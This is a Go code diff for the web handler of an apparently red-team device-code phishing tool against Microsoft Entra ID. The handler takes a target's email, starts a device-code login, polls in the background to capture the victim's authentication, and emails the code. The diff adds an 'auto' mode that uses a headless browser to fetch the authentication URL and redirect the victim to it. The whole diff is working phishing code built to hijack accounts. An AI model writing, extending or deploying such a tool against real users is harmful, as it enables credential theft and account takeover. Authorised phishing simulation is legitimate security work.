@@ -22,16 +22,19 @@ import (
 func handler(w http.ResponseWriter, r *http.Request) {
 	params := r.URL.Query()
 	email := params.Get("email")
+	auto  := params.Get("auto")
 
 	if email == "" {
-		log.Printf("no email address provided")
+		log.Print("[---] No email address found in request")
 		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
+		return
 	}
 
 	_, err := mail.ParseAddress(email)
 	if err != nil {
-		log.Printf("error parsing email address: %v", err)
+		log.Printf("[---] Invalid email address provided: %s", err)
 		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
+		return
 	}
 
 	// Insert the email address into the emails_scanned table
@@ -50,29 +53,52 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	deviceCodeResult, err := initDeviceCode(email, entraConfig, requestConfig)
 	if err != nil {
-		log.Printf("error initializing device code: %v", err)
+		log.Printf("[%s] Error initializing device code: %s", email, err)
 		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
+		return
 	}
 
 	// --- 2. Start polling for device code authentication ---
 
 	go authPoll(email, deviceCodeResult, entraConfig, requestConfig)
 
-	// --- 3. Prepare user device code email ---
+	// --- 3a. Attempt to retrieve the authentication URL ---
+
+	// Via: @denniskniep
+	//      https://github.com/denniskniep/DeviceCodePhishing
+
+	// Attempt to retrieve the authentication URL using the headless browser, if failure
+	// or if 'auto' is not true, send the email with the device code.
+	if auto == "true" {
+		log.Printf("[%s] Retrieving authentication URL", email)
+
+		authURL, err := EnterDeviceCodeWithHeadlessBrowser(deviceCodeResult, requestConfig)
+		if err == nil {
+			log.Printf("[%s] Successfully retrieved authentication URL: %s", email, authURL)
+			http.Redirect(w, r, authURL, http.StatusFound)
+			return
+		}
+
+		log.Printf("[%s] Failed to retrieve authentication URL, falling back to device code email: %s", email, err)
+	}
+
+	// --- 3b. Prepare user device code email ---
 
 	emailConfig := config.EmailConfig
 	smtpConfig := config.SMTPConfig
 
 	// Check if the SMTP config is valid
 	if smtpConfig.Host == "" || smtpConfig.Port == "" || smtpConfig.Username == "" || smtpConfig.Password == "" {
-		log.Printf("SMTP config is invalid, skipping email")
+		log.Printf("[%s] SMTP config is invalid", email)
 		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
+		return
 	}
 
 	// Check if the email config is valid
 	if emailConfig.Sender == "" || emailConfig.Subject == "" || emailConfig.Body == "" {
-		log.Printf("email config is invalid, skipping email")
+		log.Printf("[%s] Email config is invalid", email)
 		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
+		return
 	}
 
 	sender := emailConfig.Sender
@@ -85,9 +111,12 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	err = _email.SendEmail(smtpConfig, sender, recipients, subject, body)
 	if err != nil {
-		log.Printf("error sending email: %v", err)
+		log.Printf("[%s] Error sending email: %s", email, err)
+		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
+		return
 	}
 
+	log.Printf("[%s] Email sent", email)
 	http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
 }
 
